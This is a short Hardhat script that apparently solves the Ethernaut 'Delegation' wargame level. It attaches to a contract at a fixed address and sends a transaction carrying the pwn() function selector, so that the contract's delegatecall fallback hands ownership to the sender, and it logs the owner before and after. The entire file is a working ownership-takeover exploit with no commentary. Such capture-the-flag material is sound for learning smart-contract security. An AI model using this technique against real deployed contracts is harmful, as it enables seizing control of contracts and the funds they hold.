import { ethers } from "hardhat";
import { Delegation__factory } from "../typechain/factories/contracts/Delegation.sol/Delegation__factory";

async function main() {
    const [signer] = await ethers.getSigners();
    const provider = ethers.provider;
    let instance_address =  "0x27553356239190589fA1c3aFC23d3b06b94fddA0";
    let delegation = new Delegation__factory(signer).attach(instance_address);
    console.log(await delegation.owner());


    let pwn = ethers.utils.id("pwn()").substring(0,10);
    let tx = await signer.sendTransaction({
        to: delegation.address,
        data: pwn,
        gasLimit:80000,
    });
    await tx.wait();
    console.log(await delegation.owner());
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
